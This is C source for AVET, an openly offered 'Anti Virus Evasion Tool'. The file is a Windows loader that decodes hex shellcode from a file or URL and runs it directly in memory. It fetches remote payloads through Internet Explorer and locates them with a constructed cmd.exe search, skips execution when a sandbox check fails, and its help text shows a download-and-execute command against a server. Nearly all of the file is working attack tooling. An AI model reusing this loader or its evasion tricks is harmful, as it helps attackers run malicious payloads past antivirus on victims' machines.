/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include "defs.h"

void print_help();
void print_start();
int get_filesize(char *fvalue);
unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
void exec_shellcode(unsigned char *shellcode);
char* ie_download(char* string, char* sh_filename, char* wvalue);

int print_debug;

int main (int argc, char **argv)
{
  print_start();

  print_debug = 0;
  char *dvalue = NULL;
  char *evalue = NULL;
  char *fvalue = NULL;
  char *uvalue = NULL;
  char *wvalue = NULL;
  int hflag = 0;

  int index;
  int c;

  opterr = 0;

  // compute the options
  while ((c = getopt (argc, argv, "d:e:f:u:w:ph")) != -1)
    switch (c)
      {
          case 'd':
        dvalue = optarg;
        break;
          case 'e':
        evalue = optarg;
        break;
          case 'f':
        fvalue = optarg;
        break;
          case 'u':
        uvalue = optarg;
        break;
        case 'w':
          wvalue = optarg;
        break;
          case 'h':
        hflag = 1;
        break;
          case 'p':
        print_debug = 1;
        break;
          case '?':
        if (optopt == 'd')
          fprintf (stderr, "Option -%c requires an argument.\n", optopt);
        else if (optopt == 'e')
          fprintf (stderr, "Option -%c requires an argument.\n", optopt);
        else if (optopt == 'f')
          fprintf (stderr, "Option -%c requires an argument.\n", optopt);
        else if (optopt == 'u')
          fprintf (stderr, "Option -%c requires an argument.\n", optopt);
        else if (optopt == 'w')
          fprintf (stderr, "Option -%w requires an argument.\n", optopt);
        else if (isprint (optopt))
          fprintf (stderr, "Unknown option `-%c'.\n", optopt);
        else
          fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
        return 1;
          default:
        abort ();
      }

if (print_debug)
{
  //debug, show Options -> noch precompilermässig ergänzen
  printf ("dvalue = %s ", dvalue);
  printf ("evalue = %s ", evalue);
  printf ("fvalue = %s ", fvalue);
  printf ("uvalue = %s ", uvalue);
  printf ("wvalue = %s ", wvalue);
  printf ("print_debug = %d", print_debug);
  printf ("hflag = %d\n", hflag);
  for (index = optind; index < argc; index++)
    printf ("Non-option argument %s\n", argv[index]);
}

// compute #defines from defs.h
#ifdef FVALUE
  int size = strlen(FVALUE);
  fvalue=(char*)malloc(size);
  strcpy(fvalue,FVALUE);
#endif

#ifdef UVALUE
  int size = strlen(UVALUE);
  uvalue=(char*)malloc(size);
  strcpy(uvalue,UVALUE);
#endif

  // print help
  if (hflag)
    print_help();
  // exec shellcode from a given file or from defs.h
  else if (fvalue)
  {
    unsigned char *buffer;
    unsigned char *shellcode;
    int size;
#ifndef FVALUE
    if (print_debug)
      printf("exec shellcode from file\n");

    size = get_filesize(fvalue);
    buffer = load_textfile(fvalue, buffer, size);
#endif
#ifdef FVALUE
    size = strlen (FVALUE);
    buffer = FVALUE;
    
    // do evading here
    FILE *fp = fopen("c:\\windows\\system.ini", "rb");
    if (fp == NULL)
      return 0;
    fclose(fp);
#endif

    shellcode = decode_shellcode(buffer,shellcode,size);
    exec_shellcode(shellcode);
  }
  // exec from url
  else if (uvalue)
  {
    if (print_debug)
      printf("exec shellcode from url\n");

    char *sh_filename;
    sh_filename = ie_download(uvalue, sh_filename, wvalue);
    int x=strlen(sh_filename);
    if (print_debug)
      printf("\n\n%d\n\n", x);

    unsigned char *buffer;
    unsigned char *shellcode;

    int size = get_filesize(sh_filename);
    buffer = load_textfile(sh_filename, buffer, size);
    shellcode = decode_shellcode(buffer,shellcode,size);
    exec_shellcode(shellcode);
  }

  return 0;
}

void print_help()
{
  printf("avet.exe: Tool for executing, encoding and decoding shellcode in a text file\n\n");
  printf("The shellcode file is derived from a shellcode in c format, for example from msfpayload and converted with a simple sh-script, like this:\n\n");
  printf("Options:\n");
//  printf("-d decode shellcode, needs filename or url with keyfile\n");
//  printf("-e encode shellcode, needs filename with keyfile, used with -f for filename\n");
  printf("-f exec shellcode from file, needs filename\n");
  printf("-u load and exec shellcode from url using internet explorer\n");
//  printf("-w only with -u, set wait time for searching the shellcode text file, when shellcode is not, try more secs, default is 10");
  printf("-p print debug information\n");
  printf("-h help\n\n");
  printf("Example usage:\n");
  printf("avet.exe -u http://myserver.com/sh.txt -p\n");
  printf("avet.exe -f shellcode.txt\n");
//  printf("avet.exe -f shellcode.txt >> enc_sh.txt -e key.txt\n");
}

/* 
 * http://patorjk.com/software/taag/#p=display&f=3D-ASCII&t=avet
 */
void print_start()
{
  char output[] =
    
//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"
" ________  ___      ___ _______  _________  \n" 
"|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
"\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
" \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
"  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
"   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
"    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
    "\n\nAnti Virus Evasion Tool by Daniel Sauder (c) 2017\n"
    "use -h for help\n\n";
    printf("\n%s", output);
}

int get_filesize(char *fvalue)
{
  int size,rc1;
  FILE *fp1 = fopen(fvalue, "rb");
  if (fp1 == NULL)
  {
    printf("get_filesize, %s not found\n", fvalue);
    return 0;
  }
  for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
  fclose(fp1);

  if (print_debug)
    printf("get_filesize, filesize %s: %d\n", fvalue, size);

  return size;
}

// return pointer to text buffer
unsigned char* load_textfile(char *fvalue, unsigned char *buffer, int size)
{
  if (print_debug)
    printf("load_textfile called: fvalue: %s, size: %d\n", fvalue, size);

  //allocate buffer, open file, read file to the buffer, close the file
  buffer=(unsigned char*)malloc(size+1);
  int i, rc;

  for (i=0; i<size; i++)
    buffer[i]=0x0;

  FILE *fp = fopen(fvalue, "rb");
  if (fp == NULL)
  {
    printf("load_textfile, %s not found\n", fvalue);
    return 0;
  }

  for (i=0; i<size; i++)
  {
    rc = getc(fp);
    buffer[i] = rc;
  }

  if (print_debug)
    printf("%s\n",buffer);

  fclose(fp);
  return buffer;
}

// return pointer to shellcode
unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
{
  int j=0;
  shellcode=malloc((size/2));

  if (print_debug)
    printf("decode_shellcode, size for malloc: %d\nShellcode output:\n",size/2);

  int i=0;
  do
  {
    unsigned char temp[3]={0};
    sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
    shellcode[j] = strtoul(temp, NULL, 16);

    if (print_debug)
      printf("%x",shellcode[j]);

    i+=2;
    j++;
  } while(i<size);

  if (print_debug)
    printf("\n ");

  return shellcode;
}

void exec_shellcode(unsigned char *shellcode)
{
  if (print_debug)
    printf("exec_shellcode\n ");

  int (*funct)();
  funct = (int (*)()) shellcode;
  (int)(*funct)();
}

// return pointer to the filename
char* ie_download(char* string, char* sh_filename, char* wvalue)
{
  char ie[500];
  GetEnvironmentVariable("PROGRAMFILES",ie,100);
  strcat(ie,"\\Internet Explorer\\iexplore.exe");
  ShellExecute(0, "open", ie , string, NULL, SW_SHOWDEFAULT);

  // wait a little until the file is loaded
  Sleep(8000);

  // get the filename to search format in the ie temp directory
  char delimiter[] = "/";
  char *ptr;
  char *fname;
  ptr = strtok(string, delimiter);
  while(ptr != NULL)
  {
    fname = ptr;
    ptr = strtok(NULL, delimiter);
  }

  if (print_debug)
    printf("ie_download, filename: %s\n", fname);

  // split the filename
  char delimiter2[] = ".";
  char *sname;
  ptr = strtok(fname, delimiter2);
  sname = ptr;
  ptr = strtok(NULL, delimiter2);

  if (print_debug)
    printf("ie_download, name to search for: %s\n", sname);

  // search for the file in user profile

  // build searchstring
  char tmp[150];
  char tmp_home[150];
  GetEnvironmentVariable ("USERPROFILE",tmp_home,150);
  GetEnvironmentVariable ("TEMP",tmp,150);
  tmp [ strlen(tmp) - 5 ] = 0x0;
  //printf("\n\n%s\n\n",tmp);
  char searchstring[500] = "/C ";
  strncat (searchstring,tmp_home,1);
  strcat (searchstring,": && cd \"");
  strcat (searchstring,tmp);
  strcat (searchstring,"\" && dir . /s /b | find \"");
  strcat (searchstring,sname);
  strcat (searchstring,"\" > \"");
  strcat (searchstring,tmp_home);
  strcat (searchstring,"\\shellcodefile.txt\"");

  if (print_debug)
    printf ("ie_download, searchstring: %s\n", searchstring);

  // build & execute cmd
  char cmd[500];
  GetEnvironmentVariable ("WINDIR",cmd,500);
  strcat (cmd,"\\system32\\cmd.exe");
  ShellExecute (0, "open", "cmd.exe" , searchstring, NULL, SW_SHOWDEFAULT);

  // set vlue for Sleep from the cmd options
  /*
  int w=10;
  if(wvalue!=NULL)
    w = atoi(wvalue);

  if (print_debug)
    printf("ie_download: search for shellcode file and sleep %d seconds", w);

  Sleep(w*1000);
  */
  //now read the directory + filename from the textfile
  char dirfile[500] = {0};
  strcat (dirfile, tmp_home);
  strcat (dirfile, "\\shellcodefile.txt");
  //char *sh_filename;
  int size_sh_filename=0;
  int counter = 0;
  while(size_sh_filename==0 && counter <= 1000)
  {
    size_sh_filename = get_filesize (dirfile);
    Sleep(500);
    counter++;
  }

  sh_filename = load_textfile (dirfile, sh_filename, size_sh_filename);
  // there is always emtpy space at the end of the file -> delete that
  sh_filename[size_sh_filename-2]=0x0;

  if (print_debug)
    printf ("ie_download, sh_filename: >>>%s<<<, size: %d\ntest\n", sh_filename, size_sh_filename);

  return sh_filename;
}
